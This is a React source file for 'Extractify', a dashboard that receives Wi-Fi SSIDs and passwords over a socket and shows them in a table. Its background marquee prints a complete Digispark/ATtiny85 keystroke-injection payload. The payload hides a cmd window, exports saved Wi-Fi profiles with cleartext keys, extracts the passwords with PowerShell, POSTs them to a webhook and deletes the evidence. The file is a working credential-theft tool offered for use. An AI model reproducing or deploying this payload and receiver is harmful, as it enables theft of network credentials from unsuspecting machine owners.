import { useEffect, useState } from "react";
import { socket } from "./utils/socket";
import Marquee from "react-fast-marquee";
import SimpleBar from "simplebar-react";
import "simplebar-react/dist/simplebar.min.css";

interface PasswordGetterProps {
	ssid: string;
	pass: string;
}

function App() {
	const [isConnected, setIsConnected] = useState(socket.connected);
	const [passwords, setPasswords] = useState<Array<PasswordGetterProps>>([]);

	useEffect(() => {
		function onConnect() {
			setIsConnected(true);
		}

		function onDisconnect() {
			setIsConnected(false);
		}

		const onPasswords = (passwords: Array<PasswordGetterProps>) => {
			setPasswords(passwords);
		};

		socket.on("connect", onConnect);
		socket.on("disconnect", onDisconnect);
		socket.on("passwords", onPasswords);

		return () => {
			socket.off("connect", onConnect);
			socket.off("disconnect", onDisconnect);
			socket.off("passwords", onPasswords);
		};
	}, []);

	return (
		<main className="h-full grid place-items-center relative">
			{passwords.length ? (
				<div className="relative shadow-md rounded-lg overflow-auto max-h-96 block">
					<table className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
						<thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 sticky top-0">
							<tr>
								<th scope="col" className="px-6 py-3">
									SSID
								</th>
								<th scope="col" className="px-6 py-3">
									Password
								</th>
							</tr>
						</thead>
						<tbody className="h-96 overflow-y-auto ">
							{passwords
								.sort((a, b) => a.ssid.localeCompare(b.ssid))
								.map(password => (
									<tr className="bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600">
										<td className="px-6 py-4">
											{password.ssid}
										</td>
										<th
											scope="row"
											className="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white"
										>
											{password.pass}
										</th>
									</tr>
								))}
						</tbody>
					</table>
				</div>
			) : (
				<>
					<h1 className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-6xl font-extrabold text-transparent bg-clip-text bg-gradient-to-br from-sky-400 to-indigo-600 leading-loose">
						Extractify
					</h1>
					<p className="pt-24 text-sm text-indigo-300 text-opacity-60">
						Plug in your Attiny-85 to see this page in action!
					</p>
				</>
			)}
			<span className="font-mono absolute opacity-[0.15] text-blue-400 w-full overflow-hidden z-[-1]">
				<Marquee gradient={false} speed={150}>
					{`/*  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]*/#include "DigiKeyboard.h"#define KEY_DOWN 0x51 // Keyboard Down Arrow#define KEY_ENTER 0x28 //Return/Enter Keyvoid setup() {  pinMode(1, OUTPUT); //LED on Model A }void loop() {     DigiKeyboard.update();  DigiKeyboard.sendKeyStroke(0);   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run  DigiKeyboard.delay(100);  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible  DigiKeyboard.delay(500);  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu    DigiKeyboard.sendKeyStroke(KEY_M); //goto Move  for(int i =0; i < 100; i++)    {      DigiKeyboard.sendKeyStroke(KEY_DOWN);    }  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling  DigiKeyboard.delay(100);  DigiKeyboard.println("cd %temp%"); //going to temporary dir  DigiKeyboard.delay(500);  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir  DigiKeyboard.delay(500);  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir  DigiKeyboard.delay(500);  DigiKeyboard.println("powershell Invoke-WebRequest -Uri http://localhost:5050/hook -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook  DigiKeyboard.delay(1000);  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess  DigiKeyboard.delay(100);  DigiKeyboard.println("exit");  DigiKeyboard.delay(100);    digitalWrite(1, HIGH); //turn on led when program finishes  DigiKeyboard.delay(90000);  digitalWrite(1, LOW);   DigiKeyboard.delay(5000);  }`}
				</Marquee>
			</span>
		</main>
	);
}

export default App;
